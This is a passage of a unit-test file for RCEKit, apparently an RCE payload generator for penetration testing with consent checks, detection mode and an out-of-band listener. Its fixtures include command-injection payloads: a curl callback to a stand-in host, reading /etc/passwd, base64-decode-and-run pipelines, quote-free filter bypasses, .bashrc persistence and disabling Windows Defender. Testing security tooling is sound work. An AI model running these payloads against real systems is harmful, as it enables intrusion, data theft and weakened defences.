"""Unit tests for RCEKit.

Run with: python -m unittest discover -s tests  (no third-party deps required)

These tests lock in the properties that matter to the real consumer of this
tool: every emitted payload should be unique and executable/decodable, the
removed obfuscation transforms must stay removed, and the safety filters and
detection mode must behave as documented.
"""

import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import rcekit  # noqa: E402
from rcekit import (  # noqa: E402
    EvalExpr,
    FileBased,
    Observation,
    OOBListener,
    ParametricTime,
    PayloadRecord,
    Probe,
    RCEKit,
    ReflectedMath,
    Verdict,
    build_request_inputs,
    parse_raw_request,
    partition_destructive,
)


def make_record(**overrides):
    """A minimal PayloadRecord for exercising the verification oracle."""
    base = dict(
        payload="; id", mode="exploit", category="basic_enum", environment="unix",
        context="raw", encoding="none", sink=None, indicator="", safety="intrusive",
        expected_channel="response", runner="sh",
    )
    base.update(overrides)
    return PayloadRecord(**base)


import contextlib  # noqa: E402


@contextlib.contextmanager
def local_target(route):
    """Spin up a throwaway local HTTP target for detection tests. ``route`` is
    ``route(method, path, params, headers, body) -> (status, text)`` and stands
    in for the vulnerable app. Yields the base URL; tears the server down after.

    A route may return a third element, ``[(name, value), ...]``, to set response
    headers — that is how a sink whose output surfaces outside the body (a debug
    header, a Set-Cookie) is modelled."""
    import http.server
    import socketserver
    import threading
    import urllib.parse as up

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _handle(self, method):
            parsed = up.urlparse(self.path)
            params = {k: v[0] for k, v in up.parse_qs(parsed.query).items()}
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace") if length else ""
            outcome = route(method, parsed.path, params, dict(self.headers), body)
            status, text = outcome[0], outcome[1]
            extra_headers = outcome[2] if len(outcome) > 2 else ()
            self.send_response(status)
            for name, value in extra_headers:
                self.send_header(name, value)
            self.end_headers()
            try:
                self.wfile.write(text.encode(errors="replace"))
            except BrokenPipeError:
                pass

        def do_GET(self):
            self._handle("GET")

        def do_POST(self):
            self._handle("POST")

    server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "rcekit.py"


class VersionTestCase(unittest.TestCase):
    def test_version_is_semver(self):
        self.assertRegex(rcekit.__version__, r"^\d+\.\d+\.\d+$")


class CLITestCase(unittest.TestCase):
    """Exercise the real CLI (argparse + main) via subprocess, not just the API."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_help(self):
        result = self._run("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn("--verify-url", result.stdout)
        self.assertIn("--listen", result.stdout)

    def test_version_flag(self):
        result = self._run("--version")
        self.assertEqual(result.returncode, 0)
        self.assertRegex(result.stdout.strip(), r"\d+\.\d+\.\d+$")

    def test_exploit_requires_consent(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertIn("consent", (result.stdout + result.stderr).lower())

    def test_detection_only_writes_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(out.exists() and out.read_text().strip())

    def test_jsonl_records_are_valid(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.jsonl"
            self._run("--detection-only", "--environments", "unix",
                      "--output-format", "jsonl", "-o", str(out))
            lines = [l for l in out.read_text().splitlines() if l.strip()]
            self.assertTrue(lines)
            for line in lines:
                json.loads(line)  # each record must be valid JSON

    def test_nuclei_export_produces_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            result = self._run("--detection-only", "--environments", "unix",
                                "--output-format", "nuclei", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(list((Path(tmp) / "run_nuclei").glob("*.yaml")))

    def test_target_profile_end_to_end(self):
        profile = REPO_ROOT / "profiles" / "quote-filtered-unix.json"
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = self._run("--acknowledge-consent", "--target-profile", str(profile),
                               "--encodings", "none", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            text = out.read_text()
            self.assertTrue(text.strip())
            self.assertNotIn('"', text)  # profile denies quote characters


class OOBListenerTestCase(unittest.TestCase):
    def setUp(self):
        self.tokens = {"abc123token": {"payload": "; curl http://abc123token.oob.test/",
                                       "category": "oob", "context": "raw"}}
        self.listener = OOBListener(tokens=self.tokens)

    def test_correlates_token_from_host(self):
        hit = self.listener.record("http", "10.0.0.5", "abc123token.oob.test", "/")
        self.assertEqual(hit["token"], "abc123token")
        self.assertEqual(hit["payload"], "; curl http://abc123token.oob.test/")

    def test_correlates_token_from_path_exfil(self):
        hit = self.listener.record("http", "10.0.0.5", "", "/abc123token")
        self.assertEqual(hit["token"], "abc123token")

    def test_unknown_token_reported_without_payload(self):
        hit = self.listener.record("dns", "10.0.0.5", "unknownlabel.oob.test", "")
        self.assertIsNone(hit["payload"])
        self.assertEqual(hit["token"], "unknownlabel")

    def test_dns_query_is_parsed_and_answered(self):
        def encode(name):
            return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
        query = b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3 + encode("abc123token.oob.test") + b"\x00\x01\x00\x01"
        self.assertEqual(self.listener._parse_dns_qname(query), "abc123token.oob.test")
        response = self.listener._dns_response(query)
        self.assertEqual(response[:2], query[:2])       # same transaction id
        self.assertEqual(response[6:8], b"\x00\x01")     # one answer

    def test_live_http_callback_is_recorded(self):
        import urllib.request
        server = self.listener.start_http(0)
        try:
            port = server.server_address[1]
            req = urllib.request.Request(f"http://127.0.0.1:{port}/",
                                         headers={"Host": "abc123token.oob.test"})
            urllib.request.urlopen(req, timeout=3).read()
            import time
            time.sleep(0.1)
            self.assertTrue(any(h["payload"] for h in self.listener.hits))
        finally:
            server.shutdown()
            server.server_close()

    def test_invalid_answer_ip_is_rejected_at_construction(self):
        # An unusable answer IP used to raise inside the DNS thread on the first
        # query, killing it and silently dropping every callback that followed —
        # a false negative for the tool's whole OOB confirmation channel.
        for bad in ("bogus-ip", "999.1.1.1", "1.2.3", "1.2.3.4.5", "", "::1"):
            with self.subTest(answer_ip=bad):
                with self.assertRaises(ValueError):
                    OOBListener(answer_ip=bad)

    def test_valid_answer_ip_is_packed_into_the_answer(self):
        listener = OOBListener(tokens=self.tokens, answer_ip="10.11.12.13")
        query = (b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
                 + b"\x03abc\x04test\x00" + b"\x00\x01\x00\x01")
        self.assertTrue(listener._dns_response(query).endswith(bytes([10, 11, 12, 13])))

    def test_callback_is_recorded_even_when_the_answer_fails(self):
        # The hit is the signal this listener exists for, so a query we cannot
        # answer must still be reported, and must not take the thread down with
        # it. Forcing the response to fail proves both.
        import socket
        import time

        def explode(_data):
            raise RuntimeError("synthetic response failure")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()

        listener = OOBListener(tokens=self.tokens)
        listener._dns_response = explode
        self.assertTrue(listener.start_dns(port))

        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            query = (b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
                     + b"\x0babc123token\x03oob\x04test\x00" + b"\x00\x01\x00\x01")
            for _ in range(2):
                client.sendto(query, ("127.0.0.1", port))
                time.sleep(0.3)
        finally:
            client.close()

        # Both callbacks recorded: the first did not kill the listening thread.
        correlated = [h for h in listener.hits if h["token"] == "abc123token"]
        self.assertEqual(len(correlated), 2, listener.hits)


class GeneratorTestCase(unittest.TestCase):
    def setUp(self):
        self.gen = RCEKit()

    def test_templates_loaded(self):
        self.assertTrue(self.gen.payload_categories, "payload categories should load")
        self.assertIn("basic_enum", self.gen.payload_categories)
        self.assertTrue(self.gen.detection_payloads, "detection payloads should load")

    def test_yaml_template_is_rejected_without_a_third_party_parser(self):
        # RCEKit is stdlib-only: a YAML template must fail with a clear error
        # rather than attempting to import a third-party YAML parser.
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "corpus.yaml"
            path.write_text("payload_categories: {}\n", encoding="utf-8")
            gen = RCEKit(template_path=path)
            self.assertFalse(gen.payload_categories)
            self.assertIsNotNone(gen.template_error)
            self.assertIn("YAML templates are not supported", gen.template_error)

    def test_removed_encodings_are_gone(self):
        removed = {"rot13", "rot13_then_base64", "insert_special_chars",
                   "xor_polymorphic", "chunk_shuffle"}
        self.assertEqual(removed & set(self.gen.encoding_methods), set())

    def test_no_garbage_or_non_executable_markers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix", "windows"],
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertNotIn("XOR(", rec.payload)
            self.assertNotIn("shuffle::", rec.payload)

    def test_payloads_are_unique(self):
        payloads = [r.payload for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"],
        )]
        self.assertEqual(len(payloads), len(set(payloads)), "no duplicate payloads")

    def test_random_case_only_for_case_insensitive_runners(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_encodings=["random_case"],
        ) if r.encoding == "random_case"]
        self.assertTrue(records, "random_case should still apply somewhere")
        for rec in records:
            self.assertIn(rec.runner, self.gen.case_insensitive_runners)

    def test_encoding_compatibility_rules(self):
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "python"))
        self.assertTrue(self.gen._encoding_is_compatible("random_case", "cmd"))
        self.assertTrue(self.gen._encoding_is_compatible("base64", "python"))
        # The self-contained decode-and-run harness is shell-only.
        self.assertTrue(self.gen._encoding_is_compatible("base64_decode_exec", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("base64_decode_exec", "python"))

    def test_default_encodings_exclude_decoder_required_blobs(self):
        encodings = {r.encoding for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"],
        )}
        # Bare base64/hex blobs must not appear by default (they do nothing
        # unless the sink decodes them).
        self.assertFalse(encodings & self.gen.decoder_required_encodings)

    def test_base64_decode_exec_is_self_contained_and_runnable(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64_decode_exec"],
        )]
        self.assertTrue(records)
        for record in records:
            # Carries its own decoder pipeline, so it runs as-is on a shell.
            self.assertIn("|base64 -d|sh", record.payload)

    def test_decoder_required_encodings_are_opt_in(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64"],
        )]
        self.assertTrue(records)
        self.assertTrue(all(r.encoding == "base64" for r in records))

    def test_detection_mode_is_safe(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", max_safety="safe",
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertEqual(rec.mode, "detection")
            self.assertEqual(rec.safety, "safe")

    def test_max_safety_excludes_higher_tiers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"],
            selected_environments=["unix"],
            max_safety="safe",
        ))
        self.assertEqual(records, [], "persistence is stateful and must be filtered at safe tier")

    def test_sleep_family_is_classified_blocking(self):
        blocking = ["sleep 5", "time.sleep(2)", "Thread.sleep(2000)",
                    "time.Sleep(1 * time.Second)", "pg_sleep(1)", "SELECT pg_sleep(1);",
                    "Start-Sleep -Seconds 3", "select(undef, undef, undef, 1)", "timeout /T 5"]
        for payload in blocking:
            self.assertTrue(self.gen._is_blocking(payload), payload)
        for payload in ["id", "cat /etc/passwd", "setTimeout(()=>x,1000)", "whoami"]:
            self.assertFalse(self.gen._is_blocking(payload), payload)

    def test_blocking_excluded_by_default(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", include_blocking=False, max_safety="stateful",
        ))
        self.assertTrue(all(not r.blocking for r in records))

    def test_watermark_embedded_when_token_present(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
            watermark_token="TESTTOKN",
        ))
        self.assertTrue(records)
        self.assertTrue(any("TESTTOKN" in r.payload for r in records))

    def test_no_watermark_by_default(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "code_execution"],
            selected_environments=["unix", "python"],
        ))
        self.assertTrue(records)
        self.assertFalse(any("RCEKit-ID" in r.payload for r in records))

    def test_code_payloads_not_quote_wrapped(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # The raw snippet must appear executable, never wrapped into an inert
        # string literal such as "os.system('whoami')".
        self.assertIn("os.system('whoami')", payloads)
        self.assertNotIn('"os.system(\'whoami\')"', payloads)

    def test_ssti_delimiters_preserved(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python", "java"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # SSTI payloads must keep their template delimiters intact.
        self.assertIn("{{7*7}}", payloads)
        self.assertTrue(any(p.startswith("${") for p in payloads))

    def test_waf_bypass_payloads_are_quote_free(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["waf_bypass"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(any("${IFS}" in r.payload for r in records))
        # The whole point is command injection without quote characters.
        for record in records:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)

    def test_oob_requires_domain_and_gets_unique_tokens(self):
        # Without an OOB domain, {oob} payloads are dropped entirely.
        without = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        self.assertEqual(without, [])

        # With a domain, each record carries a unique correlation token/host.
        with_dom = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="oast.example.com",
        ))
        self.assertTrue(with_dom)
        tokens = [r.token for r in with_dom]
        self.assertTrue(all(tokens), "every OOB record must carry a token")
        self.assertEqual(len(tokens), len(set(tokens)), "OOB tokens must be unique")
        for record in with_dom:
            self.assertIn(record.oob_host, record.payload)
            self.assertTrue(record.oob_host.endswith(".oast.example.com"))
            self.assertEqual(record.expected_channel, "interactsh")

    def test_command_payloads_carry_match_signatures(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        by_payload = {r.payload: r.match for r in records}
        # `id` output is a recognisable uid= line; /etc/passwd starts with root:.
        self.assertEqual(by_payload.get("; id"), r"uid=\d+")
        self.assertTrue(any(m and "root:" in m for m in by_payload.values()))
        # A signature must actually match real output.
        self.assertRegex("uid=0(root) gid=0(root)", by_payload["; id"])

    def test_canary_match_is_the_token_and_oob_has_none(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"], oob_domain="x.oast.pro",
            max_safety="stateful", include_blocking=True,
        ))
        canaries = [r for r in records if r.token and r.expected_channel in {"response", "stderr"}]
        self.assertTrue(canaries)
        for record in canaries:
            self.assertEqual(record.match, record.token)
        oob = [r for r in records if r.expected_channel == "interactsh"]
        self.assertTrue(oob)
        self.assertTrue(all(r.match is None for r in oob))

    def test_destructive_flagging(self):
        self.assertTrue(self.gen._is_destructive("echo x >> ~/.bashrc", "persistence"))
        self.assertTrue(self.gen._is_destructive("rm -rf /tmp/x", "file_operations"))
        self.assertTrue(self.gen._is_destructive("Set-MpPreference -DisableRealtimeMonitoring $true", "persistence"))
        self.assertFalse(self.gen._is_destructive("id", "basic_enum"))
        self.assertFalse(self.gen._is_destructive("cat /etc/passwd", "file_operations"))
        # The record field is populated from the payload/category.
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"], max_safety="stateful",
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.destructive for r in records))

    def test_mongodb_and_graphql_sinks_present(self):
        mongo = [r for r in self.gen.generate_payload_records(
            selected_categories=["nosql_injection"], selected_environments=["mongodb"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(mongo)
        self.assertTrue(all(r.environment == "mongodb" for r in mongo))
        self.assertTrue(any("$where" in r.payload for r in mongo))
        self.assertTrue(any("$function" in r.payload for r in mongo))

        gql = [r for r in self.gen.generate_payload_records(
            selected_categories=["graphql_injection"], selected_environments=["graphql"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(gql)
        self.assertTrue(any("__schema" in r.payload for r in gql))
        # GraphQL / Mongo payloads must not be prefixed with shell separators.
        self.assertTrue(all(not r.payload.startswith((";", "|", "&")) for r in mongo + gql))

    def test_java_expression_sinks_added(self):
        sinks = {
            r.sink for r in self.gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["java"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
        }
        self.assertTrue({"spel", "ognl", "groovy"}.issubset(sinks))

    def test_json_context_escapes_payload(self):
        # A Java payload uses double quotes, which must be escaped to stay a
        # valid JSON string value.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["json"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            # Each payload must parse as the body of a JSON string.
            json.loads('"' + record.payload + '"')
        self.assertTrue(any('\\"' in r.payload for r in records))

    def test_xml_context_entity_escapes(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["xml"], selected_encodings=["none"],
        ))
        self.assertTrue(any("&quot;" in r.payload for r in records))
        self.assertFalse(any('"' in r.payload for r in records))

    def test_transport_context_carries_any_environment(self):
        # A serialization context is compatible with a non-shell environment.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["yaml"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.context == "yaml" for r in records))

    def test_shell_quoted_context_breaks_out_cleanly(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["shell_single_quoted"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            self.assertTrue(record.payload.startswith("'; "))
            self.assertNotRegex(record.payload, r";\s*;")  # no ";;" syntax error
        # Shell-quoted contexts are not offered to non-shell environments.
        self.assertFalse(self.gen._is_context_compatible("shell_single_quoted", "python", True))

    def test_default_contexts_exclude_transport_contexts(self):
        # A default run (no --contexts) must not silently include the richer
        # opt-in contexts, keeping output size and behaviour stable.
        contexts = {r.context for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
        )}
        self.assertNotIn("json", contexts)
        self.assertNotIn("shell_single_quoted", contexts)

    def test_sink_needs_separator_keeps_only_breakouts(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records))
        # The bare command (no separator) can't fire mid-command; it must be gone.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # A separator-led variant must survive.
        self.assertIn("; id", [r.payload for r in filtered])

    def test_sink_needs_separator_judges_encoded_payloads_by_canonical_form(self):
        # Separator-validity must be decided on the pre-encoding payload, not the
        # final string: a url-encoded bare command still can't fire mid-command,
        # while a url-encoded break-out still can.
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none", "url_encode"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        # Encoded bare command (decodes to plain "id") cannot break out -> dropped.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # Encoded break-out (";" percent-escaped) is still a valid separator once
        # the sink decodes it, so it must survive even though its literal form no
        # longer starts with a separator.
        self.assertIn("%3B%20id", [r.payload for r in records])
        self.assertIn("%3B%20id", [r.payload for r in filtered])
        # Nothing that survives should be an encoded bare command.
        for record in filtered:
            self.assertTrue(record.separator_led)

    def test_sink_blind_keeps_only_out_of_band_confirmable(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
        ))
        filtered = list(self.gen._filter_by_profile(records, blind=True))
        self.assertTrue(filtered)
        for record in filtered:
            self.assertTrue(record.blocking or record.oob_host or record.expected_channel == "interactsh")
        # Plain reflected `echo`/`id` payloads (response-only) must be dropped.
        self.assertFalse(any(r.payload == "; id" for r in filtered))

    def test_profile_filter_drops_denied_chars_and_long_payloads(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations", "waf_bypass"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, deny_chars="'\"", max_length=40))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records), "the filter must actually drop something")
        for record in filtered:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)
            self.assertLessEqual(len(record.payload), 40)
        # A quote-free WAF-bypass payload should survive the quote filter.
        self.assertTrue(any("${IFS}" in r.payload for r in filtered))

    def test_target_profile_file_applies_end_to_end(self):
        profile = Path(__file__).resolve().parent.parent / "profiles" / "quote-filtered-unix.json"
        self.assertTrue(profile.exists(), "example profile should ship with the repo")
        import json
        spec = json.loads(profile.read_text())
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out),
                deny_chars="".join(spec["deny_chars"]),
                max_length=spec["max_length"],
                selected_environments=spec["environments"],
                selected_contexts=spec["contexts"],
                selected_categories=spec["categories"],
                selected_encodings=spec["encodings"],
                oob_domain=spec.get("oob_domain"),
            )
            lines = out.read_text().splitlines()
            self.assertTrue(lines)
            for line in lines:
                self.assertNotIn('"', line)
                self.assertNotIn("'", line)
                self.assertLessEqual(len(line), spec["max_length"])

    def test_burp_export_writes_context_wordlists(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_burp"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertTrue(any(outdir.glob("payloads-*.txt")))
            # Without a target profile Burp users set positions themselves, so no
            # generic placeholder request is fabricated.
            self.assertFalse((outdir / "request.txt").exists())

    def test_wordlist_export_honours_selected_encodings(self):
        # The exporter must not silently drop encoded variants: an encoding the
        # tools cannot reproduce (or simply one the user asked for) belongs in the
        # wordlist as a literal line.
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none", "base64_decode_exec"],
            )
            allp = (Path(tmp) / "run_burp" / "payloads-all.txt").read_text()
            self.assertIn("; id", allp)
            self.assertTrue(any("base64 -d" in line for line in allp.splitlines()),
                            "self-contained encoded variants must survive into the wordlist")

    def test_ffuf_export_with_profile_is_runnable(self):
        request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            req = (outdir / "request.txt").read_text()
            # A real FUZZ marker, not Burp's section sign.
            self.assertIn('{"host": "FUZZ"}', req)
            self.assertNotIn("\xa7", req)
            run = (outdir / "run.sh").read_text()
            self.assertIn("ffuf -request request.txt -w payloads-all.txt", run)
            self.assertIn("-request-proto https", run)

    def test_ffuf_export_without_profile_writes_wordlists_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            # No injection point -> no fabricated request or runner.
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_path_only_profile_is_not_runnable(self):
        # A path-only URL cannot name the target host, so ffuf has nothing to run
        # against -> wordlists only, no misleading request.txt/run.sh pointing at
        # a placeholder host.
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_clears_stale_request_artifacts(self):
        # A profile-backed run followed by a wordlist-only run on the same output
        # directory must not leave the old request.txt/run.sh behind, or an
        # operator could fire a stale runner at the previous target.
        abs_request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                       "headers": {"Content-Type": "application/json"},
                       "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            outdir = Path(tmp) / "run_ffuf"
            # First run: concrete host -> request.txt + run.sh created.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=abs_request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "request.txt").exists())
            self.assertTrue((outdir / "run.sh").exists())
            # Second run on the same dir with no profile -> stale runner is gone.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_export_is_profile_request_aware(self):
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            # Burp request.txt reflects the profile's method/path/body.
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            burp_req = (Path(tmp) / "run_burp" / "request.txt").read_text()
            self.assertIn("POST /api/v1/lookup HTTP/1.1", burp_req)
            self.assertIn("Content-Type: application/json", burp_req)
            self.assertIn('{"host": "\xa7payload\xa7"}', burp_req)

            # Nuclei templates embed the same request with the payload marker.
            out2 = Path(tmp) / "run2.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out2), output_format="nuclei", request_template=request,
                selected_environments=["unix"], mode="detection",
                max_safety="stateful", include_blocking=True,
            )
            templates = "\n".join(t.read_text() for t in (Path(tmp) / "run2_nuclei").glob("*.yaml"))
            self.assertIn("POST /api/v1/lookup HTTP/1.1", templates)
            self.assertIn('{"host": "{{payload}}"}', templates)

    def test_nuclei_export_writes_valid_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="nuclei",
                selected_environments=["unix"], mode="detection",
                oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_nuclei"
            templates = list(outdir.glob("*.yaml"))
            self.assertTrue(templates)
            joined = "\n".join(t.read_text() for t in templates)
            # OOB templates must use the interactsh placeholder, not a real host.
            self.assertIn("{{interactsh-url}}", joined)
            self.assertIn("interactsh_protocol", joined)
            # Time templates normalise sleeps and never include hanging tails.
